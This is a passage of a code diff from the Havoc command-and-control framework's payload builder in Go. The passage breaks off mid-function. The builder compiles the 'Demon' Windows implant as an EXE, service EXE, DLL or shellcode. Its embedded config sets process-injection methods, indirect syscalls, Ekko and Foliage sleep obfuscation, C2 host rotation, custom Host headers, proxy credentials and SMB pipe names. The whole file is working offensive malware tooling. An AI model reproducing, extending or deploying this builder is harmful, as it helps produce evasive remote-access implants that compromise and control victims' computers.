@@ -1,684 +1,770 @@
 package builder
 
 import (
-    "Havoc/pkg/common/packer"
-    "Havoc/pkg/handlers"
-    "Havoc/pkg/logger"
-    "Havoc/pkg/profile"
-    "Havoc/pkg/utils"
-    "Havoc/pkg/win32"
-    "bytes"
-    "encoding/hex"
-    "encoding/json"
-    "fmt"
-    "io/ioutil"
-    "os"
-    "os/exec"
-    "path"
-    "strconv"
-    "strings"
+	"Havoc/pkg/common"
+	"Havoc/pkg/common/packer"
+	"Havoc/pkg/handlers"
+	"Havoc/pkg/logger"
+	"Havoc/pkg/profile"
+	"Havoc/pkg/utils"
+	"Havoc/pkg/win32"
+	"bytes"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"os"
+	"os/exec"
+	"path"
+	"path/filepath"
+	"strconv"
+	"strings"
 )
 
 // TODO: move to agent package
 
 const (
-    FILETYPE_WINDOWS_EXE            = 1
-    FILETYPE_WINDOWS_SERVICE_EXE    = 2 // TODO: implement.
-    FILETYPE_WINDOWS_DLL            = 3
-    FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
-    FILETYPE_WINDOWS_RAW_BINARY     = 5
+	FILETYPE_WINDOWS_EXE            = 1
+	FILETYPE_WINDOWS_SERVICE_EXE    = 2 // TODO: implement.
+	FILETYPE_WINDOWS_DLL            = 3
+	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
+	FILETYPE_WINDOWS_RAW_BINARY     = 5
 )
 
 const (
-    ARCHITECTURE_X64 = 1
-    ARCHITECTURE_X86
+	ARCHITECTURE_X64 = 1
+	ARCHITECTURE_X86
 )
 
 type BuilderConfig struct {
-    Compiler64 string
-    Compiler86 string
-    Nasm       string
+	Compiler64 string
+	Compiler86 string
+	Nasm       string
 }
 
 type Builder struct {
-    buildSource bool
-    sourcePath  string
-    debugMode   bool
-    silent      bool
+	buildSource bool
+	sourcePath  string
+	debugMode   bool
+	silent      bool
 
-    Payloads []string
+	Payloads []string
 
-    FileType int
-    ClientId string
+	FileType int
+	ClientId string
 
-    PatchBinary bool
+	PatchBinary bool
 
-    ProfileConfig struct {
-        MagicMzX64 string
-        MagicMzX86 string
+	ProfileConfig struct {
+		MagicMzX64 string
+		MagicMzX86 string
 
-        ImageSizeX64 int
-        ImageSizeX86 int
-    }
+		ImageSizeX64 int
+		ImageSizeX86 int
+	}
 
-    config struct {
-        Arch           int
-        ListenerType   int
-        ListenerConfig any
-        Config         map[string]any
-    }
+	config struct {
+		Arch           int
+		ListenerType   int
+		ListenerConfig any
+		Config         map[string]any
+	}
 
-    ImplantOptions struct {
-        Config []byte
-    }
+	ImplantOptions struct {
+		Config []byte
+	}
 
-    compilerOptions struct {
-        Config BuilderConfig
+	compilerOptions struct {
+		Config BuilderConfig
 
-        SourceDirs  []string
-        IncludeDirs []string
-        CFlags      []string
-        Defines     []string
+		SourceDirs  []string
+		IncludeDirs []string
+		CFlags      []string
+		Defines     []string
 
-        Main struct {
-            Dll string
-            Exe string
-        }
-    }
+		Main struct {
+			Demon string
+			Dll   string
+			Exe   string
+			Svc   string
+		}
+	}
 
-    outputPath string
-    preBytes   []byte
+	outputPath string
+	preBytes   []byte
 
-    SendConsoleMessage func(MsgType, Message string)
+	SendConsoleMessage func(MsgType, Message string)
 }
 
 func NewBuilder(config BuilderConfig) *Builder {
-    var builder = new(Builder)
+	var builder = new(Builder)
 
-    builder.sourcePath = utils.GetTeamserverPath() + "/data/implants/Demon"
-    builder.config.Arch = ARCHITECTURE_X64
+	builder.sourcePath = utils.GetTeamserverPath() + "/data/implants/Demon"
+	builder.config.Arch = ARCHITECTURE_X64
 
-    builder.compilerOptions.SourceDirs = []string{
-        "Source/Core",
-        "Source/Crypt",
-        "Source/Inject",
-        "Source/Loader",
-        "Source/Asm",
-    }
+	builder.compilerOptions.SourceDirs = []string{
+		"Source/Core",
+		"Source/Crypt",
+		"Source/Inject",
+		"Source/Loader",
+		"Source/Asm",
+	}
 
-    builder.compilerOptions.IncludeDirs = []string{
-        "Include",
-    }
+	builder.compilerOptions.IncludeDirs = []string{
+		"Include",
+	}
 
-    builder.compilerOptions.CFlags = []string{
-        "-Os -fno-asynchronous-unwind-tables -masm=intel",
-        "-fno-ident -fpack-struct=8 -falign-functions=1",
-        "-s -ffunction-sections -falign-jumps=1 -w",
-        "-falign-labels=1 -fPIC",
-        "-Wl,-s,--no-seh,--enable-stdcall-fixup",
-    }
+	builder.compilerOptions.CFlags = []string{
+		"",
+		"-Os -fno-asynchronous-unwind-tables -masm=intel",
+		"-fno-ident -fpack-struct=8 -falign-functions=1",
+		"-s -ffunction-sections -falign-jumps=1 -w",
+		"-falign-labels=1 -fPIC",
+		"-Wl,-s,--no-seh,--enable-stdcall-fixup",
+	}
 
-    builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
-    builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"
+	builder.compilerOptions.Main.Demon = "Source/Main/Main.c"
+	builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"
+	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
+	builder.compilerOptions.Main.Svc = "Source/Main/MainSvc.c"
 
-    builder.compilerOptions.Config = config
+	builder.compilerOptions.Config = config
 
-    builder.PatchBinary = false
+	builder.PatchBinary = false
 
-    return builder
+	return builder
 }
 
 func (b *Builder) DebugMode(enable bool) {
-    logger.Debug(fmt.Sprintf("Payload Builder: Enable Debug Mode %v", enable))
-    b.debugMode = enable
+	logger.Debug(fmt.Sprintf("Payload Builder: Enable Debug Mode %v", enable))
+	b.debugMode = enable
 }
 
 func (b *Builder) SetSilent(silent bool) {
-    b.silent = silent
+	b.silent = silent
 }
 
 func (b *Builder) Build() bool {
-    var (
-        CompileCommand string
-    )
+	var (
+		CompileCommand string
+	)
 
-    if b.config.ListenerType == handlers.LISTENER_EXTERNAL {
-        b.SendConsoleMessage("Error", "External listeners are not support for payload build")
-        b.SendConsoleMessage("Error", "Use SMB listener")
-        return false
-    }
+	if b.config.ListenerType == handlers.LISTENER_EXTERNAL {
+		b.SendConsoleMessage("Error", "External listeners are not support for payload build")
+		b.SendConsoleMessage("Error", "Use SMB listener")
+		return false
+	}
 
-    if !b.silent {
-        b.SendConsoleMessage("Info", "Starting build")
-    }
+	if !b.silent {
+		b.SendConsoleMessage("Info", "Starting build")
+	}
 
-    Config := b.PatchConfig()
-    if Config == nil {
-        return false
-    }
+	Config := b.PatchConfig()
+	if Config == nil {
+		return false
+	}
 
-    if !b.silent {
-        b.SendConsoleMessage("Info", fmt.Sprintf("Config size [%v bytes]", len(Config)))
-    }
+	if !b.silent {
+		b.SendConsoleMessage("Info", fmt.Sprintf("Config size [%v bytes]", len(Config)))
+	}
 
-    logger.Debug("len(Config) = ", len(Config))
-    array := "{"
-    for i := range Config {
-        if i == (len(Config) - 1) {
-            array += fmt.Sprintf("0x%02x", Config[i])
-        } else {
-            array += fmt.Sprintf("0x%02x\\,", Config[i])
-        }
-    }
-    array += "}"
+	logger.Debug("len(Config) = ", len(Config))
+	array := "{"
+	for i := range Config {
+		if i == (len(Config) - 1) {
+			array += fmt.Sprintf("0x%02x", Config[i])
+		} else {
+			array += fmt.Sprintf("0x%02x\\,", Config[i])
+		}
+	}
+	array += "}"
+	logger.Debug("array = " + array)
 
-    logger.Debug("array = " + array)
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+array)
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines, fmt.Sprintf("CONFIG_SIZE=%v", len(Config)))
 
-    b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+array)
-    b.compilerOptions.Defines = append(b.compilerOptions.Defines, fmt.Sprintf("CONFIG_SIZE=%v", len(Config)))
+	// enable debug mode
+	if b.debugMode {
+		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
+	} else {
+		if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
+			b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
+		} else {
+			b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
+		}
+	}
 
-    // enable debug mode
-    if b.debugMode {
-        b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
-    } else {
-        b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
-    }
+	// add compiler
+	if b.config.Arch == ARCHITECTURE_X64 {
+		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler64)
 
-    // add compiler
-    if b.config.Arch == ARCHITECTURE_X64 {
-        CompileCommand += b.compilerOptions.Config.Compiler64 + " "
-    } else {
-        CompileCommand += b.compilerOptions.Config.Compiler86 + " "
-    }
+		if err != nil {
+			if !b.silent {
+				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x64 compiler path: %v", err))
+				return false
+			}
+		}
 
-    // add sources
-    for _, dir := range b.compilerOptions.SourceDirs {
-        files, err := ioutil.ReadDir(b.sourcePath + "/" + dir)
-        if err != nil {
-            logger.Error(err)
-        }
+		b.compilerOptions.Config.Compiler64 = abs
 
-        for _, f := range files {
-            var FilePath = dir + "/" + f.Name()
+		CompileCommand += b.compilerOptions.Config.Compiler64 + " "
+	} else {
+		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler86)
 
-            if path.Ext(f.Name()) == ".asm" {
-                var AsmObj = "/tmp/" + utils.GenerateID(10) + ".o"
-                b.Cmd(fmt.Sprintf(b.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj))
-                CompileCommand += AsmObj + " "
-            } else if path.Ext(f.Name()) == ".c" {
-                CompileCommand += FilePath + " "
-            }
-        }
-    }
+		if err != nil {
+			if !b.silent {
+				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x86 compiler path: %v", err))
+				return false
+			}
+		}
+		b.compilerOptions.Config.Compiler86 = abs
 
-    // add include directories
-    for _, dir := range b.compilerOptions.IncludeDirs {
-        CompileCommand += "-I" + dir + " "
-    }
+		CompileCommand += b.compilerOptions.Config.Compiler86 + " "
+	}
 
-    // add cflags
-    CompileCommand += strings.Join(b.compilerOptions.CFlags, " ")
+	// add sources
+	for _, dir := range b.compilerOptions.SourceDirs {
+		files, err := ioutil.ReadDir(b.sourcePath + "/" + dir)
+		if err != nil {
+			logger.Error(err)
+		}
 
-    // add defines
-    b.compilerOptions.Defines = append(b.compilerOptions.Defines, b.GetListenerDefines()...)
-    for _, define := range b.compilerOptions.Defines {
-        CompileCommand += " -D" + define + " "
-    }
+		for _, f := range files {
+			var FilePath = dir + "/" + f.Name()
 
-    switch b.FileType {
-    case FILETYPE_WINDOWS_EXE:
-        logger.Debug("Compile exe")
-        CompileCommand += "-e WinMain "
-        CompileCommand += b.compilerOptions.Main.Exe + " "
-        break
+			if path.Ext(f.Name()) == ".asm" {
+				var AsmObj = "/tmp/" + utils.GenerateID(10) + ".o"
+				b.Cmd(fmt.Sprintf(b.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj))
+				CompileCommand += AsmObj + " "
+			} else if path.Ext(f.Name()) == ".c" {
+				CompileCommand += FilePath + " "
+			}
+		}
+	}
+	CompileCommand += b.compilerOptions.Main.Demon + " "
 
-    case FILETYPE_WINDOWS_DLL:
-        logger.Debug("Compile dll")
-        CompileCommand += "-shared -e DllMain "
-        CompileCommand += b.compilerOptions.Main.Dll + " "
-        break
+	// add include directories
+	for _, dir := range b.compilerOptions.IncludeDirs {
+		CompileCommand += "-I" + dir + " "
+	}
 
-    case FILETYPE_WINDOWS_RAW_BINARY:
-        logger.Debug("Compiler dll and prepend shellcode to it.")
+	// add cflags
+	CompileCommand += strings.Join(b.compilerOptions.CFlags, " ")
 
-        DllPayload := NewBuilder(b.compilerOptions.Config)
-        DllPayload.SetSilent(true)
-        DllPayload.ClientId = b.ClientId
-        DllPayload.SendConsoleMessage = b.SendConsoleMessage
-        DllPayload.config.Config = b.config.Config
-        DllPayload.SetArch(b.config.Arch)
-        DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
-        DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
-        DllPayload.SetOutputPath("/tmp/" + utils.GenerateID(10) + ".dll")
-        // DllPayload.SetPatchConfig(t.Profile.Config.Demon.Binary.Header)
+	// add defines
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines, b.GetListenerDefines()...)
+	for _, define := range b.compilerOptions.Defines {
+		CompileCommand += " -D" + define + " "
+	}
 
-        b.SendConsoleMessage("Info", "Compiling core dll...")
-        if DllPayload.Build() {
+	switch b.FileType {
+	case FILETYPE_WINDOWS_EXE:
+		logger.Debug("Compile exe")
+		CompileCommand += "-D MAIN_THREADED -e WinMain "
+		CompileCommand += b.compilerOptions.Main.Exe + " "
+		break
 
-            logger.Debug("Successful compiled Dll")
-            var (
-                ShellcodePath   string
-                DllPayloadBytes []byte
-                Shellcode       []byte
-            )
+	case FILETYPE_WINDOWS_SERVICE_EXE:
+		logger.Debug("Compile Service exe")
+		CompileCommand += "-D MAIN_THREADED -D SVC_EXE -lntdll -e WinMain "
+		CompileCommand += b.compilerOptions.Main.Svc + " "
+		break
 
-            DllPayloadBytes = DllPayload.GetPayloadBytes()
+	case FILETYPE_WINDOWS_DLL:
+		logger.Debug("Compile dll")
+		CompileCommand += "-shared -e DllMain "
+		CompileCommand += b.compilerOptions.Main.Dll + " "
+		break
 
-            b.SendConsoleMessage("Info", fmt.Sprintf("Compiled core dll [%v bytes]", len(DllPayloadBytes)))
+	case FILETYPE_WINDOWS_RAW_BINARY:
+		logger.Debug("Compiler dll and prepend shellcode to it.")
 
-            if b.config.Arch == ARCHITECTURE_X64 {
-                ShellcodePath = utils.GetTeamserverPath() + "/data/implants/Shellcode.x64.bin"
-            } else {
-                ShellcodePath = utils.GetTeamserverPath() + "/data/implants/Shellcode.x86.bin"
-            }
+		DllPayload := NewBuilder(b.compilerOptions.Config)
+		DllPayload.SetSilent(true)
+		DllPayload.ClientId = b.ClientId
+		DllPayload.SendConsoleMessage = b.SendConsoleMessage
+		DllPayload.config.Config = b.config.Config
+		DllPayload.SetArch(b.config.Arch)
+		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
+		DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
+		DllPayload.SetOutputPath("/tmp/" + utils.GenerateID(10) + ".dll")
+		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")
 
-            ShellcodeTemplate, err := os.ReadFile(ShellcodePath)
-            if err != nil {
-                logger.Error("Couldn't read content of file: " + err.Error())
-                b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
-                return false
-            }
+		b.SendConsoleMessage("Info", "Compiling core dll...")
+		if DllPayload.Build() {
 
-            Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
-            b.SendConsoleMessage("Info", fmt.Sprintf("Shellcode payload [%v bytes]", len(Shellcode)))
+			logger.Debug("Successful compiled Dll")
+			var (
+				ShellcodePath   string
+				DllPayloadBytes []byte
+				Shellcode       []byte
+			)
 
-            b.preBytes = Shellcode
+			DllPayloadBytes = DllPayload.GetPayloadBytes()
 
-            return true
-        }
-        break
+			b.SendConsoleMessage("Info", fmt.Sprintf("Compiled core dll [%v bytes]", len(DllPayloadBytes)))
 
-    }
+			if b.config.Arch == ARCHITECTURE_X64 {
+				ShellcodePath = utils.GetTeamserverPath() + "/data/implants/Shellcode.x64.bin"
+			} else {
+				ShellcodePath = utils.GetTeamserverPath() + "/data/implants/Shellcode.x86.bin"
+			}
 
-    CompileCommand += "-o " + b.outputPath
+			ShellcodeTemplate, err := os.ReadFile(ShellcodePath)
+			if err != nil {
+				logger.Error("Couldn't read content of file: " + err.Error())
+				b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
+				return false
+			}
 
-    if !b.silent {
-        b.SendConsoleMessage("Info", "Compiling source")
-    }
+			Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
+			b.SendConsoleMessage("Info", fmt.Sprintf("Shellcode payload [%v bytes]", len(Shellcode)))
 
-    return b.CompileCmd(CompileCommand)
+			b.preBytes = Shellcode
+
+			return true
+		}
+		break
+
+	}
+
+	CompileCommand += "-o " + b.outputPath
+
+	if !b.silent {
+		b.SendConsoleMessage("Info", "Compiling source")
+	}
+
+	return b.CompileCmd(CompileCommand)
 }
 
 func (b *Builder) SetListener(Type int, Config any) {
-    b.config.ListenerType = Type
-    b.config.ListenerConfig = Config
+	b.config.ListenerType = Type
+	b.config.ListenerConfig = Config
 }
 
 func (b *Builder) SetPatchConfig(Config any) {
-    logger.Debug("Set Patch config from Profile")
-    if Config != nil {
-        b.PatchBinary = true
-        b.ProfileConfig.MagicMzX64 = Config.(*profile.HeaderBlock).MagicMzX64
-        b.ProfileConfig.MagicMzX86 = Config.(*profile.HeaderBlock).MagicMzX86
-        b.ProfileConfig.ImageSizeX64 = Config.(*profile.HeaderBlock).ImageSizeX64
-        b.ProfileConfig.ImageSizeX86 = Config.(*profile.HeaderBlock).ImageSizeX86
-    }
+	logger.Debug("Set Patch config from Profile")
+	if Config != nil {
+		b.PatchBinary = true
+		b.ProfileConfig.MagicMzX64 = Config.(*profile.HeaderBlock).MagicMzX64
+		b.ProfileConfig.MagicMzX86 = Config.(*profile.HeaderBlock).MagicMzX86
+		b.ProfileConfig.ImageSizeX64 = Config.(*profile.HeaderBlock).ImageSizeX64
+		b.ProfileConfig.ImageSizeX86 = Config.(*profile.HeaderBlock).ImageSizeX86
+	}
 }
 
 func (b *Builder) SetFormat(Format int) {
-    b.FileType = Format
+	b.FileType = Format
 }
 
 func (b *Builder) SetArch(Arch int) {
-    b.config.Arch = Arch
+	b.config.Arch = Arch
 }
 
 func (b *Builder) SetConfig(Config string) error {
 
-    err := json.Unmarshal([]byte(Config), &b.config.Config)
-    if err != nil {
-        logger.Error("Failed to Unmarshal json to object: " + err.Error())
-        b.SendConsoleMessage("Error", "Failed to Unmarshal json to object: "+err.Error())
-        return err
-    }
+	err := json.Unmarshal([]byte(Config), &b.config.Config)
+	if err != nil {
+		logger.Error("Failed to Unmarshal json to object: " + err.Error())
+		b.SendConsoleMessage("Error", "Failed to Unmarshal json to object: "+err.Error())
+		return err
+	}
 
-    return nil
+	return nil
 }
 
 func (b *Builder) SetOutputPath(path string) {
-    b.outputPath = path
+	b.outputPath = path
 }
 
 func (b *Builder) GetOutputPath() string {
-    return b.outputPath
+	return b.outputPath
 }
 
 func (b *Builder) Patch(ByteArray []byte) []byte {
 
-    if b.config.Arch == ARCHITECTURE_X64 {
-        if b.ProfileConfig.MagicMzX64 != "" {
-            for i := range b.ProfileConfig.MagicMzX64 {
-                ByteArray[i] = b.ProfileConfig.MagicMzX64[i]
-            }
-        }
-    } else {
-        if b.ProfileConfig.MagicMzX86 != "" {
-            for i := range b.ProfileConfig.MagicMzX86 {
-                ByteArray[i] = b.ProfileConfig.MagicMzX86[i]
-            }
-        }
-    }
+	if b.config.Arch == ARCHITECTURE_X64 {
+		if b.ProfileConfig.MagicMzX64 != "" {
+			for i := range b.ProfileConfig.MagicMzX64 {
+				ByteArray[i] = b.ProfileConfig.MagicMzX64[i]
+			}
+		}
+	} else {
+		if b.ProfileConfig.MagicMzX86 != "" {
+			for i := range b.ProfileConfig.MagicMzX86 {
+				ByteArray[i] = b.ProfileConfig.MagicMzX86[i]
+			}
+		}
+	}
 
-    return ByteArray
+	return ByteArray
 }
 
 func (b *Builder) PatchConfig() []byte {
-    var (
-        DemonConfig        = packer.NewPacker(nil, nil)
-        ConfigSleep        int
-        ConfigAlloc        int
-        ConfigExecute      int
-        ConfigSpawn64      string
-        ConfigSpawn32      string
-        ConfigObfTechnique int
-        err                error
-    )
+	var (
+		DemonConfig        = packer.NewPacker(nil, nil)
+		ConfigSleep        int
+		ConfigAlloc        int
+		ConfigExecute      int
+		ConfigSpawn64      string
+		ConfigSpawn32      string
+		ConfigObfTechnique int
+		err                error
+	)
 
-    logger.Debug(b.config.Config)
+	logger.Debug(b.config.Config)
 
-    if val, ok := b.config.Config["Sleep"].(string); ok {
-        ConfigSleep, err = strconv.Atoi(val)
-        if err != nil {
-            if !b.silent {
-                b.SendConsoleMessage("Error", "Failed to convert Sleep string to int: "+err.Error())
-            }
-            return nil
-        }
-    }
+	if val, ok := b.config.Config["Sleep"].(string); ok {
+		ConfigSleep, err = strconv.Atoi(val)
+		if err != nil {
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Failed to convert Sleep string to int: "+err.Error())
+			}
+			return nil
+		}
+	}
 
-    if val, ok := b.config.Config["Indirect Syscall"].(bool); ok {
-        if val {
-            b.compilerOptions.Defines = append(b.compilerOptions.Defines, "OBF_SYSCALL")
-            if !b.silent {
-                b.SendConsoleMessage("Info", "Use indirect syscalls")
-            }
-        }
-    }
+	if val, ok := b.config.Config["Indirect Syscall"].(bool); ok {
+		if val {
+			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "OBF_SYSCALL")
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Use indirect syscalls")
+			}
+		}
+	}
 
-    // Demon Config
-    DemonConfig.AddInt(ConfigSleep)
+	if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
+		if val, ok := b.config.Config["Service Name"].(string); ok {
+			if len(val) > 0 {
+				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
+				if !b.silent {
+					b.SendConsoleMessage("Info", "Set service name to "+val)
+				}
+			} else {
+				val = common.RandomString(6)
+				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
+				if !b.silent {
+					b.SendConsoleMessage("Info", "Service name not specified... using random name")
+					b.SendConsoleMessage("Info", "Set service name to "+val)
+				}
+			}
+		}
+	}
 
-    if Injection := b.config.Config["Injection"].(map[string]any); len(Injection) > 0 {
+	// Demon Config
+	DemonConfig.AddInt(ConfigSleep)
 
-        if val, ok := Injection["Alloc"].(string); ok && len(val) > 0 {
-            switch val {
-            case "Win32":
-                ConfigAlloc = 1
-                break
+	if Injection := b.config.Config["Injection"].(map[string]any); len(Injection) > 0 {
 
-            case "Native/Syscall":
-                ConfigAlloc = 2
-                break
+		if val, ok := Injection["Alloc"].(string); ok && len(val) > 0 {
+			switch val {
+			case "Win32":
+				ConfigAlloc = 1
+				break
 
-            default:
-                ConfigAlloc = 0
-                break
-            }
-        } else {
-            if !b.silent {
-                b.SendConsoleMessage("Error", "Injection Alloc is undefined")
-            }
-            return nil
-        }
+			case "Native/Syscall":
+				ConfigAlloc = 2
+				break
 
-        if val, ok := Injection["Execute"].(string); ok && len(val) > 0 {
-            switch val {
-            case "Win32":
-                ConfigExecute = 1
-                break
+			default:
+				ConfigAlloc = 0
+				break
+			}
+		} else {
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Injection Alloc is undefined")
+			}
+			return nil
+		}
 
-            case "Native/Syscall":
-                ConfigExecute = 2
-                break
+		if val, ok := Injection["Execute"].(string); ok && len(val) > 0 {
+			switch val {
+			case "Win32":
+				ConfigExecute = 1
+				break
 
-            default:
-                ConfigExecute = 0
-                break
-            }
-        } else {
-            if !b.silent {
-                b.SendConsoleMessage("Error", "Injection Execute is undefined")
-            }
-            return nil
-        }
+			case "Native/Syscall":
+				ConfigExecute = 2
+				break
 
-        if val, ok := Injection["Spawn64"].(string); ok && len(val) > 0 {
-            ConfigSpawn64 = val
-        } else {
-            if !b.silent {
-                b.SendConsoleMessage("Error", "Injection Spawn64 is undefined")
-            }
-            return nil
-        }
+			default:
+				ConfigExecute = 0
+				break
+			}
+		} else {
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Injection Execute is undefined")
+			}
+			return nil
+		}
 
-        if val, ok := Injection["Spawn32"].(string); ok && len(val) > 0 {
-            ConfigSpawn32 = val
-        } else {
-            if !b.silent {
-                b.SendConsoleMessage("Error", "Injection Spawn32 is undefined")
-            }
-            return nil
-        }
-    } else {
-        if !b.silent {
-            b.SendConsoleMessage("Error", "Injection is undefined")
-        }
-        return nil
-    }
+		if val, ok := Injection["Spawn64"].(string); ok && len(val) > 0 {
+			ConfigSpawn64 = val
+		} else {
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Injection Spawn64 is undefined")
+			}
+			return nil
+		}
 
-    if val, ok := b.config.Config["Sleep Technique"].(string); ok && len(val) > 0 {
-        switch val {
-        case "WaitForSingleObjectEx":
-            ConfigObfTechnique = 0
-            break
+		if val, ok := Injection["Spawn32"].(string); ok && len(val) > 0 {
+			ConfigSpawn32 = val
+		} else {
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Injection Spawn32 is undefined")
+			}
+			return nil
+		}
+	} else {
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Injection is undefined")
+		}
+		return nil
+	}
 
-        case "Foliage":
-            ConfigObfTechnique = 1
-            break
+	if val, ok := b.config.Config["Sleep Technique"].(string); ok && len(val) > 0 {
+		switch val {
+		case "WaitForSingleObjectEx":
+			ConfigObfTechnique = 0
+			break
 
-        case "Ekko":
-            ConfigObfTechnique = 2
-            break
+		case "Foliage":
+			ConfigObfTechnique = 1
+			break
 
-        default:
-            ConfigObfTechnique = 0
-            break
-        }
-    } else {
-        if !b.silent {
-            b.SendConsoleMessage("Error", "Sleep Obfuscation technique is undefined")
-        }
-        return nil
-    }
+		case "Ekko":
+			ConfigObfTechnique = 2
+			break
 
-    DemonConfig.AddInt(ConfigAlloc)
-    DemonConfig.AddInt(ConfigExecute)
-    DemonConfig.AddString(ConfigSpawn64)
-    DemonConfig.AddString(ConfigSpawn32)
+		default:
+			ConfigObfTechnique = 0
+			break
+		}
+	} else {
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Sleep Obfuscation technique is undefined")
+		}
+		return nil
+	}
 
-    DemonConfig.AddInt(ConfigObfTechnique)
+	DemonConfig.AddInt(ConfigAlloc)
+	DemonConfig.AddInt(ConfigExecute)
+	DemonConfig.AddString(ConfigSpawn64)
+	DemonConfig.AddString(ConfigSpawn32)
 
-    // Listener Config
-    switch b.config.ListenerType {
-    case handlers.LISTENER_HTTP:
-        var (
-            Config    = b.config.ListenerConfig.(*handlers.HTTP)
-            Port, err = strconv.Atoi(Config.Config.Port)
-        )
+	DemonConfig.AddInt(ConfigObfTechnique)
 
-        if err != nil {
-            logger.Error("Failed convert Port string to int: " + err.Error())
-        }
+	// Listener Config
+	switch b.config.ListenerType {
+	case handlers.LISTENER_HTTP:
+		var (
+			Config    = b.config.ListenerConfig.(*handlers.HTTP)
+			Port, err = strconv.Atoi(Config.Config.Port)
+		)
 
-        DemonConfig.AddString(Config.Config.Hosts)
-        DemonConfig.AddInt(Port)
-        if Config.Config.Secure {
-            DemonConfig.AddInt(win32.TRUE)
-        } else {
-            DemonConfig.AddInt(win32.FALSE)
-        }
-        DemonConfig.AddString(Config.Config.UserAgent)
+		if err != nil {
+			logger.Error("Failed convert Port string to int: " + err.Error())
+		}
 
-        if len(Config.Config.Headers) == 0 {
-            DemonConfig.AddInt(1)
-            DemonConfig.AddString("Content-type: */*")
-        } else {
-            DemonConfig.AddInt(len(Config.Config.Headers))
-            for _, headers := range Config.Config.Headers {
-                logger.Debug(headers)
-                DemonConfig.AddString(headers)
-            }
-        }
+		switch Config.Config.HostRotation {
+		case "round-robin":
+			DemonConfig.AddInt(0)
+			break
 
-        if len(Config.Config.Uris) == 0 {
-            DemonConfig.AddInt(1)
-            DemonConfig.AddString("/")
-        } else {
-            DemonConfig.AddInt(len(Config.Config.Uris))
-            for _, uri := range Config.Config.Uris {
-                logger.Debug(uri)
-                DemonConfig.AddString(uri)
-            }
-        }
+		case "random":
+			DemonConfig.AddInt(1)
+			break
 
-        // adding proxy connection info
-        if Config.Config.Proxy.Enabled {
-            DemonConfig.AddInt(win32.TRUE)
+		default:
+			// default is random
+			DemonConfig.AddInt(1)
+			break
+		}
 
-            var ProxyUrl = fmt.Sprintf("%v://%v:%v", Config.Config.Proxy.Type, Config.Config.Proxy.Host, Config.Config.Proxy.Port)
+		DemonConfig.AddInt(len(Config.Config.Hosts))
+		for _, host := range Config.Config.Hosts {
+			logger.Debug(host)
+			DemonConfig.AddString(common.EncodeUTF16(host))
+		}
 
-            DemonConfig.AddString(ProxyUrl)
-            DemonConfig.AddString(Config.Config.Proxy.Username)
-            DemonConfig.AddString(Config.Config.Proxy.Password)
-        } else {
-            DemonConfig.AddInt(win32.FALSE)
-        }
+		DemonConfig.AddInt(Port)
 
-        break
+		if Config.Config.Secure {
+			DemonConfig.AddInt(win32.TRUE)
+		} else {
+			DemonConfig.AddInt(win32.FALSE)
+		}
+		DemonConfig.AddString(Config.Config.UserAgent)
 
-    case handlers.LISTENER_PIVOT_SMB:
-        var Config = b.config.ListenerConfig.(*handlers.SMB)
+		if len(Config.Config.Headers) == 0 {
+			if len(Config.Config.HostHeader) > 0 {
+				DemonConfig.AddInt(2)
+				DemonConfig.AddString(common.EncodeUTF16("Content-type: */*"))
+				DemonConfig.AddString(common.EncodeUTF16("Host: " + Config.Config.HostHeader))
+			} else {
+				DemonConfig.AddInt(1)
+				DemonConfig.AddString(common.EncodeUTF16("Content-type: */*"))
+			}
+		} else {
+			if len(Config.Config.HostHeader) > 0 {
+				Config.Config.Headers = append(Config.Config.Headers, "Host: "+Config.Config.HostHeader)
+			}
 
-        DemonConfig.AddString("\\\\.\\pipe\\" + Config.Config.PipeName)
+			DemonConfig.AddInt(len(Config.Config.Headers))
+			for _, headers := range Config.Config.Headers {
+				logger.Debug(headers)
+				DemonConfig.AddString(common.EncodeUTF16(headers))
+			}
+		}
 
-        break
-    }
+		if len(Config.Config.Uris) == 0 {
+			DemonConfig.AddInt(1)
